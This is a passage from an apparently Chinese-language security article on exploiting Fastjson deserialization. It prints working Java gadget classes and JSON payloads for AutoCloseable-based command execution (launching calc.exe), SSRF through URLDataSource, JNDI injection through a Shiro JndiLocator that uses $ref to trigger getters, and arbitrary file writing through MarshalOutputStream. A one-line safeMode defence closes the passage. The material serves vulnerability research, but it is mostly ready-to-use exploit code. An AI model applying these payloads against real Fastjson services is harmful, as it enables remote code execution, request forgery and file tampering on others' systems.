            this.eval = eval;
        }
        @Override
        public void close() throws Exception {
        }
    }
    class EvalRunnable implements Runnable {
        private String cmd;
        public String getCmd() {
            System.out.println("EvalRunnable getCmd() "+cmd);
            try {
                Runtime.getRuntime().exec(new String[]{"cmd","/c",cmd});
            } catch (IOException e) {
                e.printStackTrace();
            }
            return cmd;
        }
        public void setCmd(String cmd) {
            this.cmd = cmd;
        }
        @Override
        public void run() {
        }
    }
执行载荷：
    package org.heptagram.fastjson;
    import com.alibaba.fastjson.JSONObject;
    public class ExecRunnableMain {
        public static void main(String[] args) {
            String payload ="{\n" +
                    "  \"@type\":\"java.lang.AutoCloseable\",\n" +
                    "  \"@type\": \"org.heptagram.fastjson.ExecRunnable\",\n" +
                    "  \"eval\":{\"@type\":\"org.heptagram.fastjson.EvalRunnable\",\"cmd\":\"calc.exe\"}\n" +
                    "}";
            JSONObject.parseObject(payload);
        }
    }
执行结果：  
B、Readable：
    package org.heptagram.fastjson;
    import java.io.IOException;
    import java.nio.CharBuffer;
    public class ExecReadable implements AutoCloseable {
        private EvalReadable eval;
        public EvalReadable getEval() {
            return eval;
        }
        public void setEval(EvalReadable eval) {
            this.eval = eval;
        }
        @Override
        public void close() throws Exception {
        }
    }
    class EvalReadable implements Readable {
        private String cmd;
        public String getCmd() {
            System.out.println("EvalReadable getCmd() "+cmd);
            try {
                Runtime.getRuntime().exec(new String[]{"cmd", "/c", cmd});
            } catch (IOException e) {
                e.printStackTrace();
            }
            return cmd;
        }
        public void setCmd(String cmd) {
            this.cmd = cmd;
        }
        @Override
        public int read(CharBuffer cb) throws IOException {
            return 0;
        }
    }
攻击载荷：
    package org.heptagram.fastjson;
    import com.alibaba.fastjson.JSONObject;
    public class ExecReadableMain {
        public static void main(String[] args) {
            String payload ="{\n" +
                    "  \"@type\":\"java.lang.AutoCloseable\",\n" +
                    "  \"@type\": \"org.heptagram.fastjson.ExecReadable\",\n" +
                    "  \"eval\":{\"@type\":\"org.heptagram.fastjson.EvalReadable\",\"cmd\":\"calc.exe\"}\n" +
                    "}";
            JSONObject.parseObject(payload);
        }
    }
执行结果：  
$ref拓展使用  
在checkAutoType检查分析部分我们说道找寻合适的JNDI较为困难，其原因是大多数JNDI的gadget都继承自DataSource和RowSet，所以反序列化的类过不了checkAutoType的检查，那么JNDI注入真的就无法使用了吗？浅蓝师傅和threedr3am师傅给出了关于通过$ref引用功能来触发getter的方法，理论上我们可以通过这种方式实现RCE，而且还能够在不开启AutoType的情况下，任意调用大部分当前反序列化对象的getter方法，如果存在危险的method则可以进行攻击，下面我们分别来看一下具体的方法：  
浅蓝师傅给出的示例(原来的基础上稍有变形)：
    package org.heptagram.fastjson;
    import javax.activation.DataSource;
    import javax.activation.URLDataSource;
    import java.net.URL;
    public class RefSSRF extends Exception {
        public RefSSRF() {
        }
        private DataSource dataSource;
        public DataSource getDataSource() {
            return dataSource;
        }
        public void setDataSource(URL url) {
            this.dataSource = new URLDataSource(url);
        }
    }
执行载荷：
    package org.heptagram.fastjson;
    import com.alibaba.fastjson.JSON;
    public class RefSSRFMain {
        public static void main(String[] args) {
            String a ="{\n" +
                    "  \"@type\": \"java.lang.Exception\",\n" +
                    "  \"@type\": \"org.heptagram.fastjson.RefSSRF\",\n" +
                    "  \"dataSource\": {\n" +
                    "    \"@type\": \"java.net.URL\",\n" +
                    "    \"val\": \"http://127.0.0.1:4444/Exploit\"\n" +
                    "  }\n" +
                    "}";
            JSON.parseObject(a);
        }
    }
执行之后可以看到有请求过来：  
这里我们对原理做一个简单的介绍：  
可以看到载荷中一共传入了两个@type，其中第一个为java.lang.Exception，它是Throwable的继承类，而用于反序列化Throwable异常类的是ThrowableDeserializer，所以又进入到了之前的execeptClass部分，之后根据根据第二个@type的值来获取具体类，并且根据传入的指定期望类进行加载：  
之后在RefSSRF中将第二个@type的数值作为参数传入，同时注意到这里的setDataSource的参数是URL类型，在FastJSON中URL类型允许被反序列化，也就是说可以调用到setDataSource方法，并且实例化一个URLDataSource对象：  
如果我们要实现SSRF那么我们可以通过调用URLDataSource的getInputStream()方法来触发连接请求，而使用JSON.parseObject在解析JSON时默认就会调用getInstance()(在setXXX之后调用)，从而实现SSRF:  
通过$ref引用功能，我们可以触发大部分getter方法，理论上当存在危险的method方法时我们可以通过此种方法在不开启AutoType的情况下来实现RCE，下面以threedr3am师傅提供的payload为例(代码部分取自Y4er师傅)：
    package org.heptagram.fastjson;
    import com.alibaba.fastjson.JSON;
    import org.apache.shiro.jndi.JndiLocator;
    import org.apache.shiro.util.Factory;
    import javax.naming.NamingException;
    public class RefRCE   extends JndiLocator implements Factory, AutoCloseable {
        private String resourceName;
        public RefRCE() {
        }
        public T getInstance() {
            System.out.println(getClass().getName() + ".getInstance() invoke.");
            try {
                return (T) this.lookup(this.resourceName);
            } catch (NamingException var3) {
                throw new IllegalStateException("Unable to look up with jndi name '" + this.resourceName + "'.", var3);
            }
        }
        public String getResourceName() {
            System.out.println(getClass().getName() + ".getResourceName() invoke.");
            return this.resourceName;
        }
        public void setResourceName(String resourceName) {
            System.out.println(getClass().getName() + ".setResourceName() invoke.");
            this.resourceName = resourceName;
        }
        @Override
        public void close() throws Exception {
        }
    }
载荷部分：
    package org.heptagram.fastjson;
    import com.alibaba.fastjson.JSON;
    public class RefRCEMain {
        public static void main(String[] args) {
            String json = "{\n" +
                    "  \"@type\":\"java.lang.AutoCloseable\",\n" +
                    "  \"@type\": \"org.heptagram.fastjson.RefRCE\",\n" +
                    "  \"resourceName\": \"ldap://localhost:1099/Exploit\",\n" +
                    "  \"instance\": {\n" +
                    "    \"$ref\": \"$.instance\"\n" +
                    "  }\n" +
                    "}";
            System.out.println(json);
            JSON.parse(json);
        }
    }
执行结果：  
#### 文件相关操作
Gadget寻找思路(浅蓝师傅提供)：
  * 通过set方法或构造方法指定文件路径的OutputStream
  * 通过set方法或构造方法传入字节数据的OutputStream，并且可以通过set方法或构造方法传入一个OutputStream，最后可以通过 write方法将传入的字节码write到传入的OutputStream
  * 需要一个通过set方法或构造方法传入一个OutputStream，并且可以通过调用toString、hashCode、get、set、构造方法调用传入的 OutputStream的flush方法  
下面是个网络上公开的一个Gadget，目前只适用于JDK11版本：  
```java  
$ echo -ne "RMB122 is here" | openssl zlib | base64 -w 0  
eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==
$ echo -ne "RMB122 is here" | openssl zlib | wc -c  
22
    载荷如何：
    ```java
    {
        '@type':"java.lang.AutoCloseable",
        '@type':'sun.rmi.server.MarshalOutputStream',
        'out':
        {
            '@type':'java.util.zip.InflaterOutputStream',
            'out':
            {
               '@type':'java.io.FileOutputStream',
               'file':'dst',
               'append':false
            },
            'infl':
            {
                'input':
                {
                    'array':'eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==',
                    'limit':22
                }
            },
            'bufLen':1048576
        },
        'protocolVersion':1
    }
测试载荷：
    package org.heptagram.fastjson;
    import com.alibaba.fastjson.JSON;
    import java.io.IOException;
    public class FileWrite {
        public static void main(String[] args) throws IOException {
            String json = "{\n" +
                    "  '@type': \"java.lang.AutoCloseable\",\n" +
                    "  '@type': 'sun.rmi.server.MarshalOutputStream',\n" +
                    "  'out': {\n" +
                    "    '@type': 'java.util.zip.InflaterOutputStream',\n" +
                    "    'out': {\n" +
                    "      '@type': 'java.io.FileOutputStream',\n" +
                    "      'file': 'e:/filewrite.txt',\n" +
                    "      'append': false\n" +
                    "    },\n" +
                    "    'infl': {\n" +
                    "      'input': {\n" +
                    "        'array': 'eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==',\n" +
                    "        'limit': 22\n" +
                    "      }\n" +
                    "    },\n" +
                    "    'bufLen': 1048576\n" +
                    "  },\n" +
                    "  'protocolVersion': 1\n" +
                    "}";
            JSON.parse(json);
        }
    }
执行结果：  
## 防御措施
开启safeMode
    ParserConfig.getGlobalInstance().setSafeMode(true);
## 参考链接